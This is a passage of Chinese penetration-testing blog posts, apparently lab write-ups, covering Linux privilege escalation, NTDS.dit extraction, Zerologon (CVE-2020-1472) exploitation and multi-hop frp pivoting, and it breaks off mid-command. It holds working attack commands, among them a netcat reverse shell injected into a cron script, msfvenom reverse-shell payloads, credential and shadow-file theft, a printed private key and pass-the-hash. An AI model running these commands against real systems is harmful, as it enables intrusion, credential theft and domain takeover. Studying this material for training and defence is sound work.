use mysql;\nmysql> create table foo(line blob);\nmysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));\t#记得修改路径\nmysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';\nmysql> create function do_system returns integer soname 'raptor_udf2.so';\nmysql> select * from mysql.func;\nmysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');\nmysql> exit\n$ /tmp/rootbash -p\t\t#退出mysql后执行命令\n\nrootbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nrm /tmp/rootbash  #请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！\nexit\n\n```\n\n***\n\n\n\n### #5 密码&密钥\n\n-  历史命令\n\n```bash\n$ cat ~/.*history\t\t\n```\n\n-  配置文件\n\n```bash\nuser@debian:~$ cat /home/user/myvpn.ovpn\nclient\n......\nremote-cert-tls server\nauth-user-pass /etc/openvpn/auth.txt\t#包含密码txt文件\t\ncomp-lzo\nverb 1\nreneg-sec 0\n\nuser@debian:~$ cat /etc/openvpn/auth.txt\nroot\npassword123\t\t#获取密码\n```\n\n-  SSH密钥\t(藏在根目录)\n\n```bash\nuser@debian:~$ ls  -la /.ssh\ntotal 12\ndrwxr-xr-x  2 root root 4096 Aug 25  2019 .\ndrwxr-xr-x 22 root root 4096 Aug 25  2019 ..\n-rw-r--r--  1 root root 1679 Aug 25  2019 root_key\nuser@debian:~$ cat /.ssh/root_key \n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm\ngLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl\np4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo\nOHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD\neV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET\nZ36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2\nNiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ\nYaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+\n5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el\nWUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7\nVDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7\n6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW\n1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K\n824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6\nWg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc\nU7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1\nRg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi\nSXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV\nd+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im\njQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa\n871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok\nX2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4\nCLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN\nWhp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4\nLnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==\n-----END RSA PRIVATE KEY-----\n\n$ chmod 600 root_key\n$ ssh -i root_key root@10.10.63.222\n```\n\n- 查找/etc下的密码\n\n```bash\ncd /etc\ngrep -r password\n```\n\n\n***\n\n\n\n### #6 弱文件权限\n\n- shadow文件可读可写\n\n```bash\n#破解hash\n$ ls -l /etc/shadow\n-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow\t#文件可读可写\n\n$ cat /etc/shadow\nroot:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::\ndaemon:*:17298:0:99999:7:::\nbin:*:17298:0:99999:7:::\n\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n#写入hash\n$ mkpasswd -m sha-512 123456\n$6$G770c2Pp4gpik//c$3m2qme9asqkg5lJ1DNX9YcGitn6Ek7r6IKsWEF8.Z8N8SJctCdbaTxs1Fcvvqzy/QrQ3TOJIA9KzK9Mf8qBVm/\n$ nano /etc/shadow\n$ su root\n```\n\n- 可写/etc/passwd\n  - 用户名:密码:UID:GID:用户信息:家目录:命令/shell\n  - test:X:0:0:root:/root:/bin/bash\n\n```bash\n$ openssl passwd -1 -salt [salt] [password]\n$ openssl passwd -1 -salt new 123\n$ echo \"hello:\\$1\\$new\\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\" >> /etc/passwd     #注意$符需要转义\n```\n\n****\n\n\n\n### #7 定时任务\n\n- ###### 定时文件可编辑\n\n\n```bash\ncat /etc/crontab\ncrontab -l\n\nuser4@polobox:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n*/5  *    * * * root    /home/user4/Desktop/autoscript.sh\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n\necho \"mkfifo /tmp/tfrn; nc 10.11.53.68 8888 0</tmp/tfrn | /bin/sh >/tmp/tfrn 2>&1; rm /tmp/tfrn\" >> /home/user4/Desktop/autoscript.sh\n```\n\n- tar 通配符\n\n```bash\nuser@debian:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\t\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh\t#这个文件\n\nuser@debian:~$ cat /usr/local/bin/compress.sh\n#!/bin/sh\ncd /home/user\ntar czf /tmp/backup.tar.gz *\t\t#tar 命令后面跟的是通配符*\n\n$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.53.68 LPORT=4444 -f elf -o shell.elf\t#生成反向shell\n$ scp shell.elf user@10.10.63.222:/home/user/\t#传输到目标机\n$ chomd +x shell.elf\t\n$ touch /home/user/--checkpoint=1\t#在/home/user目录中创建两个文件\n$ touch /home/user/--checkpoint-action=exec=shell.elf\t#在/home/user目录中创建两个文件\n$ user@debian:~$ ls\t\n--checkpoint=1  --checkpoint-action=exec=shell.elf  myvpn.ovpn  shell.elf  tools\n$ nc -lvp 4444\t#开启监听\n```\n\n- crontab-PATH 环境变量\n\n```bash\nuser@debian:~$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\t#请注意，PATH 变量以 /home/user开头，这是我们用户的主目录\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n#\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh\n\nuser@debian:~$ nano overwrite.sh\nuser@debian:~$ chmod +x /home/user/overwrite.sh\nuser@debian:~$ cat overwrite.sh \n#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash\nuser@debian:~$ /tmp/rootbash -p\t\t\t#等待脚本执行后\nrootbash-4.1# \nrootbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\n\nrm /tmp/rootbash  #请记住删除修改后的代码，删除 /tmp/rootbash 可执行文件并退出提升的 shell，然后再继续，因为稍后您将在房间中再次创建此文件！\nexit\n```\n\n***\n\n\n\n### #8 NFS\n\n网络文件系统：网络文件系统允许客户端计算机上的用户通过网络挂载共享文件或目录。NFS使用远程过程调用（RPC）在客户端和服务器之间路由请求。\n\n目标机开启了/tmp共享\n\n```bash\nuser@debian:~$ cat /etc/exports\n```\n\n![image-20220518175200970](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/612199c3359bec53f0b5ada64da87c30.png)\n\n```bash\n$ showmount -e 10.10.109.232\n```\n\n![image-20220519101446347](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/dad20bdd1df9f4de5c790886d6dcd056.png)\n\n漏洞利用(攻击机)\n\n```bash\n$ mkdir /tmp/nfs\t\t#创建文件夹\n$ mount -o rw,vers=2 10.10.63.222:/tmp /tmp/nfs\t\t#挂载目录，IP是目标机\n$ msfvenom -p linux/x86/exec CMD=\"/bin/bash -p\" -f elf -o /tmp/nfs/shell.elf\t#生成exploit\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 48 bytes\nFinal size of elf file: 132 bytes\nSaved as: /tmp/nfs/shell.elf\n\n$ chmod +xs /tmp/nfs/shell.elf\t\t#添加执行权限\n```\n\n![image-20220518175454810](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/bb2661aa8b515535055df39a6d9dd51c.png)\n\n目标机\n\n```bash\nuser@debian:/tmp$ ls\nbackup.tar.gz  root.pm  shell  shell2  shell2.c  shell.c  shell.elf  useless\nuser@debian:/tmp$ /tmp/shell.elf\t#执行exploit\nbash-4.1# id\nuid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)\nbash-4.1# ls /root\n```\n\n![image-20220518175559457](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/f0cf3e5b659e94bffb96cc96371faece.png)\n\n\n***\n\n\n\n### #9 PATH变量\n\necho $PATH\n\n```bash\nuser5@polobox:~$ ./script    #脚本执行的ls命令\nDesktop  Documents  Downloads  Music  Pictures\tPublic\tscript\tTemplates  Videos\nuser5@polobox:~$ echo \"/bin/bash\" > /tmp/ls      #在/tmp目录下生成一个替换的ls命令\nuser5@polobox:~$ chmod +x /tmp/ls\t\t\t\t#添加执行权限\nuser5@polobox:~$ export PATH=/tmp:$PATH\t\t\t#修改环境变量为/tmp\nuser5@polobox:~$ ./script\t\t\t\t\t\t#执行脚本弹回\nWelcome to Linux Lite 4.4 user5\n \nTuesday 17 May 2022, 05:05:26\nMemory Usage: 364/1991MB (18.28%)\nDisk Usage: 6/217GB (3%)\nSupport - https://www.linuxliteos.com/forums/ (Right click, Open Link)\n \nroot@polobox:~# id\nuid=0(root) gid=0(root) groups=0(root),1004(user5)\n```\n\n***\n\n参考文章：\n\n- https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md\n- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Privilege Escalation.md)\n- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation__-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)\n- https://payatu.com/guide-linux-privilege-escalation\n","tags":["提权"]},{"title":"解密Wireshark Kerberos协议","url":"/2022/11/07/解密Wireshark-Kerberos协议/","content":"\n### #1 原始报文\n\n![image-20220908162617609](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/61e61014277a2683611a32ab5cac7a31.png)\n\n\n\n### #2 域控导出NTDS.dit和SYSTEM文件\n\n```bash\nvssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ntds.dit\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\system.hive\nvssadmin delete shadows /all\n```\n\n![image-20220908162947619](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/d66f5857b61f15723e33afdcd5213463.png)\n\n\n\n### #3 kali安装 libesedb-utils\n\n```\nsudo apt install libesedb-utils\n```\n\n\n\n### #4 git 克隆 ntdsxtract\n\n```bash\ngit clone https://github.com/csababarta/ntdsxtract.git\n```\n\n![image-20220908164711048](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c95f93fce535f8dd4a118dcfbd6c845d.png)\n\n\n\n### #5 python2 安装 pycryptodome\n\n```\npython2 -m pip install pycryptodome\n```\n\n![image-20220908163452363](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/c6825d7e4ef926a122fadb194c9ee5d4.png)\n\n\n\n### #6 提取出多个文件，在ntds.dit.export目录下  **(这个步骤等待的时间较长)**\n\n![image-20220908163632883](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/11117420d4fa5afa32fc314c3014a20c.png)\n\n![image-20220908164504631](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/e25c82cdcf4c7066ce0df15edb81d62f.png)\n\n\n\n### #7 提取出 keytab文件\n\n![image-20220908164816450](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/45617889359798fc34465d860c4a1a55.png)\n\n\n\n### #8 Wireshark 导入keytab文件  编辑->首选项->Protocols->KRB5\n\n<img src=\"https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/81e818b81cc454398a7bac9019ae6b18.png\" alt=\"image-20220908164946014\" style=\"zoom:33%;\" />\n\n\n\n### #9 解密enc-part部分，就能看到 Login session key。\n\n![image-20220908165522558](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/09/531a7ef9dbdd758a6631f5d0265a5cb9.png)\n\n","tags":["Kerberos","Wireshark"]},{"title":"CVE-2020-1472 Netlogon权限提升","url":"/2022/11/07/CVE-2020-1472-Netlogon权限提升/","content":"\n### # 0x00 目录\n\n1. 漏洞分析\n2. 漏洞利用条件\n3. 漏洞利用\n\n***\n\n### # 0x01 漏洞分析\n\n攻击者在通过NetLogon ( MS-NRPC)协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。Netlogon使用的AES认证算法中的vi向量默认为o，导致攻击者可以绕过认证，可以向域发起Netlogon计算机账户认证请求,使用8字节全0 client challenge不断尝试得到一个正确的8字节全O client credential通过认证，再通过相关调用完成对域控密码的修改。\n\n影响版本\n\n* Windows Server 2008 R2 for x64-based Systems Service Pack 1\n* Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\n* Windows Server 2012\n* Windows Server 2012 (Server Core installation)\n* Windows Server 2012 R2\n* Windows Server 2012 R2 (Server Core installation)\n* Windows Server 2016\n* Windows Server 2016 (Server Core installation)\n* Windows Server 2019\n* Windows Server 2019 (Server Core installation)\n* Windows Server, version 1903 (Server Core installation)\n* Windows Server, version 1909 (Server Core installation)\n* Windows Server, version 2004 (Server Core installation)\n\n***\n\n### # 0x02 漏洞利用条件\n\n1. 与域控通讯（在不在域内都行）\n2. 能访问域控MS-NRPC服务，\n\n当攻击者使用Netlogon远程协议(MS-NRPC)建立与域控制器连接的易受攻击的 Netlogon安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。\n\n要利用此漏洞，未通过身份验证的攻击者需要将MS-NRPC连接到域控制器，以获取域管理员访问权限。\n\n***\n\n### # 0x03 复现工具\n\n漏洞验证工具：[https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py](https://github.com/SecuraBV/CVE-2020-1472/blob/master/zerologon_tester.py)\n\n漏洞利用工具：https://github.com/risksense/zerologon/blob/master/set_empty_pw.py\n\n密码重置工具：[https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py](https://github.com/risksense/zerologon/blob/master/reinstall_original_pw.py)\n\n### # 0x04 漏洞复现\n\n#### 0). 漏洞验证脚本\n\n获取dc主机名\n\n```\nWindows：nbtstat -A 10.10.10.8\nLinux：nbtscan\n```\n\n\n\n漏洞验证工具：zerologon_tester.py\n\n```\npython3 zerologon_tester.py OWA 10.10.10.8\n```\n\n![image-20220810131156397](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/ad4c8bc4c00f7fcc8539b0c6d69f6107.png)\n\n\n\n#### 1).  更改dc密码为空\n\n利用set_empty_pw.py将dc密码设置为空，即`31d6cfe0d16ae931b73c59d7e0c089c0`在利用secretsdump.py读dc的hash\n\n```\npython3 set_empty_pw.py OWA 10.10.10.8  #OWA为域控主机名\nimpacket-secretsdump redteam.red/OWA\\$@10.10.10.8 -no-pass\n```\n\n![image-20220810133549444](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/4a7a9f5050bc6d5e2c012d25e94ddb30.png)\n\n获取到域管理员administrator用户hash：redteam.red\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::\n\n![image-20220810152925651](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/0deb21948f62266afccca6532636e63c.png)\n\npth登录\n\n```\nimpacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312\n```\n\n![image-20220810162528929](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5ab8efe26779c0c580977b9d345a4d50.png)\n\n**因为密码置空后，用户在 AD 中的密码（ntds.dic）与本地的注册表 /lsass 里面的密码不一致，会脱离域控，所以要将其恢复**。\n\n\n\n#### 2).  还原密码\n\n#### #1 第一种方法\n\n密码还原工具restorepassword.py：https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/restorepassword.py\n\n利用plain_password_hex\n\n![image-20220810143125888](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/5c3a8ee428689c54755d1ca0dd3c9525.png)\n\n用restorepassword.py将密码还原，还原后利用空口令登录失败\n\n```bash\npython3 restorepassword.py redteam.red/owa@owa -target-ip 10.10.10.8 -hexpass 595ee95117c30b874201c95971f38dd5ae0a97a564a70a366977619ea5cb3e3f18f4a4e9f3d99ec0e676e2a75594afec2ad567081ac566b118c7941e1e247a4855dd3c50edb5ed236e5cc17cf7336deb6291183f034dad603d1f475228f6d39cbea07b85335c85c554071bfa9fbc45c0f036e21e25da514c272e92db7e160d46aa1b298539cfa5f5c83773a9901983443c999e2750972f5aca71461217ecf84c7fdaca9deb1ca0000e88a587ea3aea6183db82ed5f9e66603568c2708f395e3ed96997254a8dd25b5afc06dd52c52f25e063d7b782cfa2e40667eb2bc2a4b0830f1199db0b4b4ef9ab599f983a18a567\n```\n\n![image-20220810143023360](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/aad8f7c2a28fe1f0f0ae1f0525bdc8d2.png)\n\n\n\n#### #2 第二种方法\n\n从注册表/lsass里面读取机器用户原先的密码，恢复AD里面的密码\n\n利用redteam.red/administrator hash登录\n\n```bash\nimpacket-wmiexec redteam.red/Administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4 -codec gb2312\n```\n\n![image-20220810153151365](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/903fb9e42a3015d99e4cca47e86eeccc.png)\n\n读取sam、system、security文件\n\n```\nreg save hklm\\sam sam.hive\nreg save hklm\\system system.hive\nreg save hklm\\security security.hive\n```\n\n![image-20220810153451987](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/acaa94a386ea3d32f427090193558e16.png)\n\n通过SMB share复制回攻击机\n\n```\nC:\\>copy sam.hive \\\\10.10.10.128\\share\\sam.hive\n已复制         1 个文件。\n\nC:\\>copy security.hive \\\\10.10.10.128\\share\\security.hive\n已复制         1 个文件。\n\nC:\\>copy system.hive \\\\10.10.10.128\\share\\system.hive\n已复制         1 个文件。\n\nC:\\>exit\n```\n\n![image-20220810153845364](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/cc093d005f3aedfa5facda684b6cd700.png)\n\n或者利用impacket-smbclient链接到smb将文件下载到本地。\n\n```\nimpacket-smbclient redteam.red/administrator@10.10.10.8 -hashes :579da618cfbfa85247acf1f800a280a4\n# use c$\n# ls\n# get sam.hive\n# get security.hive\n# get system.hive\n# exit\n```\n\n![image-20220810154730324](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/b905ef8ec45562a91c609ac83ae2d1d9.png)\n\n\n\n利用secretsdump 读取到hash\n\n```\nimpacket-secretsdump -sam sam.hive  -system system.hive  -security security.hive LOCAL\n```\n\n![image-20220810160422687](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/2ae82be519b899cab986509040e36729.png)\n\n利用reinstall_original_pw.py将密码恢复。\n\n```\npython3 reinstall_original_pw.py owa 10.10.10.8 4e4890dbf2da33f3ce4087f5dd6a4dba\n```\n\n![image-20220810160619182](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/08/29a737488a1edfa98f9ad7bc71775279.png)\n","tags":["CVE-2020-1472"]},{"title":"frp之一层网络代理 / 二层网络代理 / 三层网络代理","url":"/2022/11/04/frp之一层网络代理  二层网络代理  三层网络代理/","content":"\n# frp之一层网络代理 / 二层网络代理 / 三层网络代理\n\n\n\n![image-20221103155324246](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9a8daaf9a97e19adb4eb2e2aed0f0724.png)\n\n\n\n### # 一层网络代理\n\n获取10.10.10.13 Web服务器权限后搭建frp扫描DMZ区内主机。\n\n1. 使用VPS作为FRP服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 用Windows Server 2012作为客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5]\nremote_port = 1080             # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n3. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n4. 命令前加上proxychains4\n\n```bash\nproxychinas4 ssh root@10.10.10.15\n```\n\n****\n\n\n\n### # 二层网络代理\n\n经过在DMZ区的信息收集发现还有一个网段为192.168.30.0/24的办公区网段，利用frp在DMZ区与办公区搭建一个socks5代理。\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在服务端上绑定的IP地址\nbind_port = 7000       # 在服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上起一个frp客户端\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 192.168.2.200    # 指向frp服务端绑定的ip地址\nserver_port = 7000             # 指向frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在DMZ区的10.10.10.15 Ubuntu上执行\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5]\ntype = tcp\nremote_port = 10808            # 代理所使用的端口，会被转发到服务器\nplugin = socks5                # 代理的类型\n```\n\n5. 编辑proxychains4的配置文件：/etc/proxychains4.conf \n\n![image-20221103171204998](https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/b897624a4285bd1d9040d74d16ad340a.png)\n\n6. 命令前加上proxychains4\n\n```bash\nproxychinas4 rdesktop 192.168.30.20\n```\n\n***\n\n\n\n### # 三层网络代理\n\n通过代理访问到核心区的**192.168.60.10域控制器**\n\n1. 使用VPS作为frp服务端，在VPS上执行：\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 0.0.0.0    # 在VPS上的FRP服务端上绑定的IP地址\nbind_port = 7000       # 在VPS上的FRP服务端上绑定的端口\n```\n\n2. 在Windows Server 2012 上执行以下命令：\n\n启动frp客户端，将本地端口10808转发到VPS的1080端口。\n\n```bash\n.\\frpc.exe -c .\\frpc.ini\n\n# 客户端配置文件frpc.ini的内容如下\n[common]\nserver_addr = 192.168.2.200    # 指向VPS上frp服务端绑定的ip地址\nserver_port = 7000             # 指向VPS上frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 10.10.10.13         # 本地监听的ip地址\nlocal_port = 10808             # 要转发的本地端口\nremote_port = 1080             # 要转发到的远程端口\n```\n\n3. 在Windows Server 2012 再起一个frp服务端\n\n```bash\n.\\frps.exe -c .\\frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 10.10.10.13    # 在Windows Server 2012服务端上绑定的IP地址\nbind_port = 7000       # 在服Windows Server 2012服务端上绑定的端口\n```\n\n4. 在**DMZ区**的10.10.10.15 Ubuntu上执行，启动一个客户端\n\n启动frp客户端，链接上Web服务端，将本地10808端口转发到Windows Server 2012的10808端口上。\n\n```bash\n.\\frpc -c .\\frpc.ini\n\n# frpc.ini 配置内容\n[common]\nserver_addr = 10.10.10.13      # 指向Windows Server 2012 frp服务端绑定的ip地址\nserver_port = 7000             # 指向Windows Server 2012 frp服务端绑定的端口\n[socks5_forward]\ntype = tcp                     # 所使用的协议类型\nlocal_ip = 192.168.30.40       # 本地监听的IP地址\nlocal_port = 10809             # 要转发的本地端口\nremote_port = 10808            # 要转发到的远程端口\n```\n\n5. 在DMZ区的10.10.10.15 Ubuntu上再启动一个frp服务端\n\n```bash\n./frps -c ./frps.ini\n\n# frps.ini 配置内容\n[common]\nbind_addr = 192.168.30.40      # 指定frp服务器端ip地址\nbind_port = 7000               # 指定frp服务端绑定端口\n```\n\n6. 在办公区的文件服务器上执行\n\n启动frp客户端，链接Ubuntu的frp服务端，并在10809端口上启动socks5代理服务后，转发到Ubuntu服务器的10809端口\n\n```bash\n.\\frpc.exe -c 